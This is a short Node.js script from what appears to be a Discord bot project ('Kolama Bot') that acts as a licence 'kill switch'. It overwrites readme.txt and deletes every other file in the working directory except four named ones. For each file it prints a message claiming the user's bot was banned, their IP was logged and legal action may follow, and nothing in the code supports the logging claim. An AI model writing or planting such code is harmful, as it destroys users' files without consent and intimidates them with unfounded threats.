const fs = require('fs');
fs.writeFileSync('./readme.txt', 'You broke the licence, please read LICENSE.txt', 'utf-8');
fs.readdirSync('./').forEach(file => {
    if (file === 'license.txt' || file === 'readme.txt' || file === 'deletelmao.js' || file === 'license.js') return;
    else fs.unlink(`./${file}`, f => { });
    console.log(`LICENSE API | Deleting Bot Files
    Hello dear user! Your bot ID was banned in API of Kolama Bot.
    Mostly likely you abused our src of bot or broke license of it!
    Please read LICENSE.txt to dont break license again : )
    Breaking LICENSE can lead to legal actions next time.
    Your IP and Bot ID was logged, thanks for understanding.
    We hopping your files werent in bot folder due bot folder is now gonna!
    `)
});
